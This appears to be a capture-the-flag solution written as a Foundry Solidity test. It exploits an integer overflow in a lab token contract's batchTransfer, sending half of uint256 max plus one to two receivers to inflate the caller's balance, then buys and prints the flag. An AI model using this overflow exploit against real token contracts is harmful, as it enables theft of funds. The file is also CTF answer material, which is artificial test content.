// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.6;

import {Test, console} from "forge-std/Test.sol";
import {Integer} from "src/Integer.sol";
pragma abicoder v2;

contract Solve is Test {
    Integer integer;

    function test() public {
        integer = new Integer();
        console.log("before exploit:", integer.balanceOf(address(this)));
        uint256 value = type(uint256).max / 2 + 1;
        address[] memory receivers = new address[](2);
        receivers[0] = address(this);
        receivers[1] = address(1337);
        integer.batchTransfer(receivers, value);
        console.log("after exploit:", integer.balanceOf(address(this)));
        integer.buyFlag();
        console.log("flag:", integer.flag(address(this)));
    }
}
